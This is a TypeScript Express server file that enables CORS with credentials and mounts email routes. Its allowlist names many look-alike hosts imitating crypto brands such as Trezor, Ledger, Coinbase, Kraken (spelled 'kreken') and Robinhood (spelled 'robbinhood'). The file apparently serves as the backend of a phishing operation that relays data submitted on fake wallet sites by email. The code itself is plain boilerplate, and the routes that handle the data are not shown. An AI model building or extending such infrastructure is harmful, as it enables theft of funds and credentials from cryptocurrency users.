import express, { Request, Response } from "express";
import dotenv from "dotenv";
import cors from "cors";
import emailRoutes from "./routes/email.routes";

dotenv.config();

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware 
app.use(cors({
    origin: ["http://localhost:3000",
        "https://trezor-website-pod-five-sigma-dfasf-324324-343244.vercel.app",
        "https://i-trust-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
        "https://robbinhood-i-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
        "https://uphold-eight-capital-five-sigma-dfasf-324324-343244-pune.vercel.app",
        "https://ledger-delta-wet-woad-five-sigma-dfasf-324324-343244.vercel.app",
        "https://gemini-ten-orpin-delta-three-woad-five-sigma-343244.vercel.app",
        "https://kreken-gamma-orpin-delta-three-woad-five-sigma-343244.vercel.app",
        "https://net-coin-xi-orpin-delta-three-woad-five-sigma-343244.vercel.app",
        "https://exodus-three-net-orpin-delta-three-woad-five-sigma-343244.vercel.app",
        "https://ndax-theta-bsite--five-sigma-dfasf-324324-343244.vercel.app",
        "https://coinbase-umber-sigma-dfasf-324324-343244-pune.vercel.app",
        // AWS URL
        // TRezor
        "https://website-pod-five-sigma-dfasf-324324.cryptousawallet.com",
        "https://main.dl1l0wtr7nwnp.amplifyapp.com",
    ],
    methods: ["GET", "POST", "PUT", "DELETE", "PATCH"],
    credentials: true,
}));
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

app.get("/api/v1", (req: Request, res: Response) => {
    res.send("API v1 is working!");
});

// ✅ Mount email routes
app.use("/api/v1", emailRoutes);

app.listen(PORT, () => {
    console.log(`Server running at http://localhost:${PORT}`);
});
